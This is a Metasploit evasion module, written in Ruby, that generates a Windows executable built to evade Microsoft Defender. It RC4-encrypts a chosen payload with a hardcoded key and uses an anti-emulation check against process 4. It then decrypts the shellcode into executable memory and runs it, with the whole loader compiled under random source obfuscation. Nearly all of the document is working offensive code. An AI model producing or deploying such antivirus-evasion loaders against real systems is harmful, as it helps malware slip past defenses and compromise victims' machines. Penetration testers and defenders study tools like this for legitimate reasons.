##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/compiler/windows'

class MetasploitModule < Msf::Evasion

  def initialize(info={})
    super(merge_info(info,
      'Name'        => 'Microsoft Windows Defender Evasive EXE',
      'Description' => %q{
        This module allows you to generate a Windows EXE that evades against Microsoft
        Windows Defender. Multiple techniques such as shellcode encryption, source code
        obfuscation, Metasm, and anti-emulation are used to achieve this.

        For best results, please try to use payloads that use a more secure channel
        such as HTTPS or RC4 in order to avoid the payload network traffic getting
        caught by AV.
      },
      'Author'      => [ 'sinn3r' ],
      'License'     => MSF_LICENSE,
      'Platform'    => 'win',
      'Arch'        => ARCH_X86
    ))
  end

  def rc4_key
    '4ASMkFslyhwXehNZw048cF1Vh1ACzyyA'
  end

  def get_payload
    @c_payload ||= lambda {
      opts = {
        format: 'rc4',
        key: rc4_key
      }

      p = payload

      return {
        size: p.encoded.length,
        c_format: Msf::Simple::Buffer.transform(p.encoded, 'c', 'buf', opts)
      }
    }.call
  end

  def c_template
    @c_template ||= lambda {
      %Q|#include <Windows.h>
#include <rc4.h>

#{get_payload[:c_format]}

int main() {
  int lpBufSize = sizeof(int) * #{get_payload[:size]};
  LPVOID lpBuf = VirtualAlloc(NULL, lpBufSize, MEM_COMMIT, 0x00000040);
  memset(lpBuf, '\\0', lpBufSize);

  HANDLE proc = OpenProcess(0x1F0FFF, false, 4);
  if (proc == NULL) {
    RC4("#{rc4_key}", buf, (char*) lpBuf, #{get_payload[:size]});
    void (*func)();
    func = (void (*)()) lpBuf;
   (void)(*func)();
  }

  return 0;
}|
    }.call
  end

  def run
    puts c_template
    bin = Metasploit::Framework::Compiler::Windows.compile_random_c(c_template)
    print_status("Compiled binary size: #{bin.length}")
    file_create(bin)
  end

end